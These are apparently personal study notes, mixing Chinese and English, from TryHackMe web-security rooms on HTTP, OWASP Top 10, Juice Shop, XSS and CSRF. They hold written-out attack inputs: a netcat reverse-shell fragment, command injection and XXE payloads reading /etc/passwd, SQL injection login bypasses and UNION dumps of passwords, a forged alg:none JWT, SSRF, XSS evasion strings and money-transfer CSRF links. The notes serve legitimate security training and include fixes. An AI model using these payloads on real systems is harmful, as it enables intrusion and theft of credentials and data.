## How Websites Work:
	--> https://tryhackme.com/r/room/howwebsiteswork
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	--> Front End (Client-Side)
	--> Back End (Server-Side)
### HTML 
		--> <img src="img/cat-1.jpg">
		--> injection : input area -- create a link <a herf>
### JS 
		--> document.getElementById("demo").innerHTML = "Hack the Planet";
		--> <button onclick='document.getElementById("demo").innerHTML = "Hack the Planet";'>Click Me!</button>
		--> 敏感資料暴露 e.g username //password

## HTTP in Detail : 
	--> https://tryhackme.com/r/room/httpindetail
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
###  Methods
		--> GET Request
		--> POST Request
			--> 提交資料並可能建立新記錄
		--> PUT Request
			--> 向網絡伺服器提交數據以更新信息
		--> DELETE Request
		
###  狀態碼:
		--> 200-299 - 成功
			--> 200 - OK 
			--> 201 - 創建
		--> 300-399 - 重定向
			--> 301 - 永久移動
			--> 302 - 找到(暫時的更改) 
		--> 400-499 - 客戶端錯誤
			--> 400 - 錯誤請求
			--> 401 - 未授權
			--> 403 - 禁忌(無權查看此資源)
			--> 404 - 頁面不存在
			--> 405 - 方法不允許(POST/GET)
		--> 500-599 - 伺服器錯誤
			--> 500 - 內部服務錯誤
			--> 503 - 服務不可用(停機)
###  header : 
		--> request : 	
			--> GET / HTTP/1.1
			--> Host: 想要造訪網站
			--> User-Agent:瀏覽器軟體和版本號
			--> Referer:引向此頁面的網頁
			--> Cookie：
			--> Accept-Encoding:
		--> response :
			--> HTTP/1.1 200 OK
			--> Server:Web 伺服器軟體和版本號
			--> Content-Type:
			--> Content-Length: 
			--> Set-Cookie：要儲存的信息
			--> Cache-Control： 快取
			--> Content-Encoding
## OWASP Top 10
	-->https://tryhackme.com/r/room/owasptop10 
	
###  Injection: 
		--> SQL | command 
		--> reverval shell : 
			--> ;nc -e /bin/bash
		--> Commands to try
			--> Linux : 
				whoami
				id
				ifconfig/ip addr
				uname -a
				ps -ef
				
			--> Windows :
				whoami
				ver
				ipconfig
				tasklist
				netstat -an	
	
### Broken Authentication :
		--> session cookies 
###  Sensitive Data Exposure :
		--> 查詢語言（  SQL ）語法
		--> sqlite3 <database-name>
			> .tables  :查看資料庫中的表
			> PRAGMA table_info(customers);  :查看表信息
			> SELECT * FROM customers;
			
			--> hash : https://crackstation.net/
### > XML External Entity (XXE)
		--> RCE | DOS | SSRF
		--> !DOCTYPE : 定義 ROOT 元素
			--> !ELEMENT : 定義一個新的元素
				--> !ENTITY : 定義一個新的實體
				
		--> <!DOCTYPE note [ <!ELEMENT note (to,from,heading,body)> <!ELEMENT to (#PCDATA)> <!ELEMENT from (#PCDATA)> <!ELEMENT heading (#PCDATA)> <!ELEMENT body (#PCDATA)> ]>
		
		--> note.dtd (#PCDATA 表示可解析的字元資料。)
			!DOCTYPE note - 定義名為note的文檔的根元素 
			!ELEMENT note - 定義 note 元素必須包含以下元素：“to、from、heading、body”
			!ELEMENT to - 將 to 元素定義為「#PCDATA」類型
			!ELEMENT from - 將 from 元素定義為「#PCDATA」類型
			!ELEMENT 標題 - 將 heading 元素定義為「#PCDATA」類型
			!ELEMENT body - 將body 元素定義為「#PCDATA」類型		
			
		--> XXE payload: 
			<?xml version="1.0"?>
			<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
			<root>&read;</root>		
###  Broken Access Control : 
		--> IDOR : 輸入處理方式中的錯誤配置
		--> id =1 => id =2
###  Security Misconfiguration :
		--> 安全配置錯誤
###  Cross-site Scripting
		--> XSS (Javascript、VBScript、Flash 和 CSS)
		--> Test : <script>alert(“Hello World”)</script>
		--> document.write) => 覆蓋網站的 HTML
		--> XSS Keylogger =>記錄使用者的所有擊鍵
			--> http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html
###  Insecure Deserialization (不安全反序列化)
###  Components with Known Vulnerabilities (具有已知漏洞的元件)
		--> outdata and don.t updata
		--> exploit-db
###  Insufficent Logging & Monitoring (日誌記錄與監控不足)

## OWASP Top 10 - 2021
	--> https://tryhackme.com/r/room/owasptop102021
###  Broken Access Control (IDOR) --id
### Cryptographic Failures
		--> 敏感資料外洩
		--> 結構化查詢語言（SQL） : 
			=> sqlite3 <database-name>
			> .tables				查看資料庫中的表
			> PRAGMA table_info(customers);		查看表格資訊
			> SELECT * FROM customers; 		轉儲資訊
			
		--> before sqlite3 webapp.db
			<-- wget http://10.10.162.69:81/assets/webapp.db
			> .tables
			> PRAGMA table_info(users);
			> SELECT * FROM users; 
###  Injection
		--> SQL Injection :
		--> command Injection : $(cat /etc/passwd)
###  Insecure Design 
		--> 設計缺陷 :密碼重置機制
			--> joseph 
			--> colour : ROYGBIV (Red, Orange, Yellow, Green, Blue, Indigo, and Violet)
###  Security Misconfiguration(安全配置錯誤)
		=> 調試介面 /console
			--> import os; print(os.popen("ls -l").read())
###  Vulnerable and Outdated Components
		--> CVE :  Exploit-DB 
###  Identification and Authentication Failures
		=> admin = admin%20
		=> darren
###  Software and Data Integrity Failures
		--> check Hash value => prove 完整性
			=> md5sum | sha1sum | sha256sum
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
		--> 軟體完整性故障 : 
			--> 更改 jQuery (第三方庫)
			
			--> cal Hash value
				-->  https://www.srihash.org/
				--> <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
		--> 資料完整性故障
			--> 會話令牌 -- Cookie
			--> JSON Web Tokens (JWT) <-- Base64
				--> Header | Payload | signature 
			--> change Header : alg : "none"
			--> delete signature 但保留末尾的點 (.)
			
			--> {"typ":"JWT","alg":"none"} {"username":"admin","exp":1718450906}
			--> eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzE4NDUwOTA2fQ.
	
###  Security Logging & Monitoring Failures
		-->  安全日誌​​記錄和監控故障
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	--> Server-Side Request Forgery (SSRF)
		--> 10.10.225.128:8087/download?server=secure-file-storage.com
			=> http://10.10.225.128:8087/download?server=10.11.92.230:8087&id=75482342
			=> nc -lvnp 8087
## OWASP Juice Shop
	--> https://tryhackme.com/r/room/owaspjuiceshop
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
###  Injection
		--> SOLi : 
			--> login 
				=> email : ' or 1=1 --
				=> email : ' or 1=1 and email not like('%admin%');--
				=> email : bender@juice-sh.op'-- 
				=> email : ' or 1=1 and email like('%bender%');--
				
			-->  database : 
				=> 搜尋欄 : union select 1,email,password,4,5,6,7 from users;--
				=> 網址 : http://ip:port/rest/product/search?q=a')%20union%20select%20email,%20password,%203,%204,%205,%206,%207%20from%20users;--
###  Broken Authentication
		-->  Bruteforce 
			=> admin@juice-sh.op
			=> password : §§ 
			=> /usr/share/dirb/wordlists/others/best1050.txt
			=> cp /usr/share/dirb/wordlists/others/best1050.txt best1050.txt
		--> 重置密碼機制 
			=> 忘記密碼 : brother name -- Samuel
###  Sensitive Data Exposure
		--> About us :使用條款
			=> http://10.10.118.205 /ftp/legal.md
			=> 下載 Acquisitions.md
			
			=> mc.safesearch@juice-sh.op : Mr. N00dles 
			
			-> 下載備份檔
				=> Poison Null Byte %00
					--> NULL 終止符 : 告訴伺服器在該點終止，從而將字串的其餘部分清空
					--> URL 中 NULL 位元組的百分號必須自行編碼 (%25 = %)
				=> /ftp/package.json.bak%2500.md
###  Broken Access Control
		--> F12 :  http://10.10.118.205 /main-es2015.js
			=> path：administration
			=> http://ip:port/#/administration
			
		--> GET /rest/basket/1 HTTP/1.1 =>  GET /rest/basket/2 HTTP/1.1
		
		--> http://MACHINE_IP /#/administration
###  Cross-Site Scripting XSS		
		--> DOM
			=> 搜尋欄 : <iframe src="javascript:alert(`xss`)">
			=> 搜尋欄 : <script>alert("XSS1")</script>
		--> Stored XSS 
			=> HTTP-Header XSS  
				--> GET /rest/saveLogin) when logout
				--> True-Client-IP  標頭與 X-Forwarded-For 標頭類似
				--> True-Client-IP : <iframe src="javascript:alert(`xss`)">
				
			=> 客戶端 : 電子郵件 XSS
				-->  Post /api/Users
					--> {"email": "<script>alert(\"XSS2\")</script>", "password":""}
			=> 伺服器端 : 
				--> Post as feedback
					--> <<script>alert("XSS3")</script>script>alert("XSS3")<</script>/script>
				
			=> description XSS
				--> PUT /api/Products/9 HTTP/1.1
				--> "description": "<script>alert(\"XSS4\")</script>",
		--> 反射型 XSS : 
			--> history
			--> id=<iframe src="javascript:alert(`xss`)">
###  challenges
		--> /#/score-board/	
		--> 以其他用戶的名義發布一些反饋 : {"UserId":2,"rating":2,"comment":"1"}	
		--> NULL 位元組 : %00
			--> 付款 : http://baseurl/redirect?to=https://google.de%00https://gratipay.com/bkimminich
		
		--> 負值 error :
			--> 更改購物籃中產品數量的請求 {"quantity": -500}
		--> 將 Bender 的密碼更改為 slurmCl4ssic
			--> {"status":"success","data":{"id":3,"email":"bender@juice-sh.op","password":"fa3360bfd5e190cb65a113c198dfa164","createdAt":"2015-09-03 05:24:11.000 +00:00","updatedAt":"2015-09-03 05:24:11.000 +00:00"}
		--> 將 O-Saft 產品描述中的連結更改為http://kimminich.de
		--> 復活節彩蛋
		--> 偽造優惠券代碼
## Advanced Client-Side Attacks : 
	--> https://tryhackme.com/module/advanced-client-side-attacks	
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	--> XSS :
		--> 同源策略（SOP）
			--> 防止一個網頁上的惡意腳本取得對另一個頁面上敏感資料的存取權
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		--> JS : F12=>Console
			--> alert("XSS")
			--> console.log("test text")
			--> btoa("string") //base64
			--> atob("base64_string") //base64 -d
			--> document.cookie
			--> alert(document.cookie)
###  Reflected XSS : 
			--> 易受攻擊的程式碼:
			--> PHP : 
				--> easy to chage value => $_GET['q'];
					--> usr.php?q=<script>alert(document.cookie)</script>
				--> recover : htmlspecialchars($search_query)
					=> 取代字元<, >, &, ",'以防止執行輸入中的腳本
			--> Node.js : 
				--> easy to chage value =>
					app.get('/search', function(req, res) {
   						 var searchTerm = req.query.q;
					--> http://shop.thm/search?q=<script>alert(document.cookie)</script>
				--> recover : sanitizeHtml(searchTerm) => 刪除不安全的元素和屬性
					=> //escapeHtml()
					
			--> Flask.py
				--> easy to chage value =>
					@app.route("/search")
						query = request.args.get("q")
					--> http://shop.thm/search?q=<script>alert(document.cookie)</script>
				--> recover : escape(query) = markupsafe.escape()
			
			--> C# ASP.NET
				-->  easy to chage value =>
					 var userInput = Request.QueryString["q"];
					 Response.Write("User Input: " + userInput);
				--> recover : HttpUtility.HtmlEncode(userInput)
###  Stored XSS :
			--> PHP : 
				--> $comment = $_POST['comment'];
					 mysqli_query($conn, "INSERT INTO comments (comment) VALUES ('$comment')");
				--> XSS  : htmlspecialchars($row['comment']);
				--> SQLi : mysqli_real_escape_string()
				
			--> Node.js : 
				--> sanitizeHtml(comment) => 刪除允許清單以外的 HTML 元素
			--> Flask.py
				--> comment_content = request.form['comment']
				--> escape()函數來確保用戶提交的評論中的任何特殊字元都被替換為 HTML 實體
			--> C# ASP.NET
				--> HttpUtility.HtmlEncode() | Parameters.AddWithValue()
				
###  DOM-Based XSS : 
			--> F12=>Console
				--> 建立新元素 document.createElement()
				--> 為任何元素新增子元素 element.append()
			-->  URLSearchParams(window.location.search).get('name');
				--> url?name=
				--> url?name=hello <script>alert("XSS")</script>
			--> recover : 
				--> 1. 避免直接使用document.write()
				--> 2. encodeURIComponent(name)
###  case : 
			--> Between HTML tags : <script>alert(document.cookie)</script>
			--> Within HTML tags  : "><script>alert(document.cookie)</script>
			--> Inside JavaScript : ';alert(document.cookie)//
			
			--> 自訂 XSS 有效負載 : https://github.com/payloadbox/xss-payload-list
			--> 繞過長度限制 : https://github.com/terjanq/Tiny-XSS-Payloads
			--> 封鎖清單 : https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
				--> 採用十六進位表示 : 9 (TAB) | A （LF）| D （LF）
					=> <IMG SRC="jav&#x09;ascript:alert('XSS');">
					=> <IMG SRC="jav&#x0A;ascript:alert('XSS');">
					=> <IMG SRC="jav&#x0D;ascript:alert('XSS');">
					--> <IMG SRC="javascript:alert('XSS');">
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	--> TASK :
		--> Reflected XSS :
			=> url/?...<img src=copyparty onerror=alert(1)>
			
		--> Stored XSS :
			=> connect : <script>alert(document.cookie)</script>
				=> login :admin | admin123
##  CSRF 
		---> 跨站點請求偽造（CSRF 或XSRF）
			--> 利用cookie（憑證）的事實來實現的
			--> 攻擊者代表使用者（透過瀏覽器）偽造和提交未經授權的請求
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
		--> 傳統CSRF
			--> 透過提交表單執行的狀態變更操作
			--> 惡意連結並將其透過電子郵件發送給受害者(same browser)
				<-- js : 自動將金額從受害者的瀏覽器轉移到攻擊者的銀行帳戶
		
		--> XMLHttpRequest  CSRF	
			--> 線上應用程式-- 非同步伺服器通訊
				--> XMLHttpRequest或Fetch API 和 JavaScript 來產生更動態的使用者介面
			--> 虛假的非同步 HTTP 請求（通常是 POST 請求）
			--> 受害者打開一個帶有腳本的惡意網頁
			
		--> 基於Flash的CSRF
			--> 利用 Adob​​e Flash Player 元件中的缺陷進行CSRF攻擊的技術
			--> 攻擊者網站上發布的惡意 Flash 檔案 (.swf)通常會向其他網站發送未經授權的請求
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
		--> Basic CSRF - Hidden Link/Image Exploitation:
			--> 隱藏連結/圖像利用 (src or href)
			--> 用了用戶瀏覽器自動傳輸 cookie 等憑證的事實
			--> 社會工程
			--> e.g <a href="https://mybank.thm/transfer.php" target="_blank">Click Here</a>  
			--> recover : 伺服器驗證請求是否包含唯一令牌
				=> csrf_token :  $_COOKIE
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		--> Double Submit Cookie Bypass
			--> 繞過雙重提交 Cookie 技術 :
				--> 會話 Cookie 劫持（中間人攻擊） : 惡意軟體、網路間諜
				--> 破壞同源策略（攻擊者控制的子域） : 
				--> 利用XSS漏洞 : steal cookies
				
			--> to understand what tokenis :
				--> login => F12 => Application => cookies => copy token
					=> decode it =>  base64 
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		--> Samesite Cookie Bypass :
			--> 防止跨網域資料外洩、CSRF 和 XSS 攻擊的可靠保護措施
			
			--> type : 
				--> Lax (寬鬆): 
					--> 意味著 cookie 不會與跨來源 POST 請求一起發送
					--> 外部網站發起的GET請求中仍然會包含cookie
				--> Strict (嚴格) :
					--> 意味著 cookie 僅與來自設定 cookie 的相同網站的請求一起發送
				--> None :
					--> 可以方便地用於需要跨不同來源存取 cookie 的場景
					--> 需要Secure屬性
					--> 確保 cookie 僅透過安全連線傳輸
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		--> Few Additional Exploitation Techniques
			--> 易受攻擊的CORS配置 ( Access-Control-Allow-Origin: * )
				--> 許來自任何來源的請求
			--> 引用標頭繞過
				--> Referer 標頭

	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
	--> TASK :
		=> via email : 
		=> 1.: Hidden Link/Image Exploitation: 
			<a href="http://mybank.thm:8080/dashboard.php?to_account=GB82MYBANK5698&amount=1000" target="_blank">Click Here to Redeem</a>
		=> 2. Double Submit Cookie Bypass
			--> change password => 自動提交表單以更改密碼 => login 
## DOM 
		--> Document Object Model
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		--> JS : F12=>Console
			--> 新段落 	: const paragraph = document.createElement("p");
			--> 新的文字節點 	: const data = document.createTextNode("Our new text");
			--> 加入文字	: paragraph.appendChild(data);
			--> 附加新段落	: document.getElementsByTagName("p")[0].appendChild(paragraph);
			
		--> 可以注入 DOM => 改變使用者看到的內容
		
		--> single page application (SPA) 單頁應用程式
			--> 僅在使用者第一次造訪網站時載入一次DOM
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
		--> DOM-Based Attacks : 
			--> 
			--> 
			-->
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		--> DOM-Based XSS
			--> window.location
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		--> XSS Weaponisation
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		--> DOM-Based Attack Challenge

	


	
